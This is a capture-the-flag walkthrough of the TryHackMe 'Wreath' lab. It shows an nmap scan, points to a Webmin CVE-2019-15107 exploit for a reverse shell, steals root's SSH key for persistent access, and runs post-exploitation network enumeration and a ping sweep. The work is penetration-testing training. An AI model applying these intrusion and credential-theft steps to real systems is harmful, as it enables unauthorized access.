link: https://tryhackme.com/room/wreath
<code><h2>Enumaration PublicFacing Webserver </h2>
┌──(duke㉿kali)-[~/Documents/THM_Wreath]
└─$ nmap -sV -sC -Pn 10.200.85.200
Starting Nmap 7.92 ( https://nmap.org ) at 2024-01-24 05:31 CST
Nmap scan report for 10.200.85.200
Host is up (0.53s latency).
Not shown: 920 filtered tcp ports (no-response), 75 filtered tcp ports (host-unreach)
PORT      STATE  SERVICE    VERSION
22/tcp    open   ssh        OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 9c:1b:d4:b4:05:4d:88:99:ce:09:1f:c1:15:6a:d4:7e (RSA)
|   256 93:55:b4:d9:8b:70:ae:8e:95:0d:c2:b6:d2:03:89:a4 (ECDSA)
|_  256 f0:61:5a:55:34:9b:b7:b8:3a:46:ca:7d:9f:dc:fa:12 (ED25519)
80/tcp    open   http       Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
|_http-title: Did not follow redirect to https://thomaswreath.thm
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1c
443/tcp   open   ssl/http   Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
|_ssl-date: TLS randomness does not represent time
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Thomas Wreath | Developer
| ssl-cert: Subject: commonName=thomaswreath.thm/organizationName=Thomas Wreath Development/stateOrProvinceName=East Riding Yorkshire/countryName=GB
| Not valid before: 2024-01-24T10:54:15
|_Not valid after:  2025-01-23T10:54:15
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1c
9090/tcp  closed zeus-admin
10000/tcp open   http       MiniServ 1.890 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 115.90 seconds

<b>Service Webmin is vulnarable</b>
link: https://github.com/MuirlandOracle/CVE-2019-15107

use exploit to get reverse shell

<b>download /root/.ssh/id_rsa to get pernament access via ssh</b>

┌──(duke㉿kali) [/Documents/THM_Wreath]
└─$ cp id_rsa root                        
┌──(duke㉿kali) [/Documents/THM_Wreath]
└─$ chmod +600 root 
┌──(duke㉿kali) [/Documents/THM_Wreath]
└─$ ssh -i root root@10.200.85.200
[root@prod-serv ~]# id
uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
[root@prod-serv ~]# 

<h2>Enumaration/Pivoting </h2>
run linpeas
╔══════════╣ Mails (limit 50)
 13718632      0 -rw-rw----   1  twreath  mail            0 Nov  7  2020 /var/mail/twreath                          
 12674676      0 -rw-rw----   1  dheenaxe mail            0 Jan 25 07:58 /var/mail/dheenaxe
 13718632      0 -rw-rw----   1  twreath  mail            0 Nov  7  2020 /var/spool/mail/twreath
 12674676      0 -rw-rw----   1  dheenaxe mail            0 Jan 25 07:58 /var/spool/mail/dheenaxe

 [root@prod-serv ~]# netstat -a
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 0.0.0.0:hostmon         0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:ndmp            0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:ssh             0.0.0.0:*               LISTEN     
tcp        0     36 ip-10-200-85-200.eu:ssh ip-10-50-86-201.e:52266 ESTABLISHED
tcp        1      0 ip-10-200-85-200.e:ndmp ip-10-50-86-177.e:50390 CLOSE_WAIT 
tcp        0      0 ip-10-200-85-200.:52180 ip-10-50-8:search-agent ESTABLISHED
tcp        0      0 ip-10-200-85-200.:56776 ip-10-50-86-177.e:https ESTABLISHED
tcp        1      0 ip-10-200-85-200.e:ndmp ip-10-50-86-231.e:58264 CLOSE_WAIT 

[root@prod-serv ~]# arp -a
ip-10-200-85-150.eu-west-1.compute.internal (10.200.85.150) at 02:1a:65:6e:5d:1f [ether] on eth0
ip-10-200-85-100.eu-west-1.compute.internal (10.200.85.100) at 02:35:7b:8f:3a:af [ether] on eth0
ip-10-200-85-1.eu-west-1.compute.internal (10.200.85.1) at 02:16:e7:43:1c:11 [ether] on eth0

[root@prod-serv ~]# for i in {1..255}; do (ping -c 1 10.200.85.${i} | grep "bytes from" &); done
64 bytes from 10.200.85.1: icmp_seq=1 ttl=255 time=0.293 ms
64 bytes from 10.200.85.200: icmp_seq=1 ttl=64 time=0.051 ms
64 bytes from 10.200.85.250: icmp_seq=1 ttl=64 time=0.574 ms


</code>

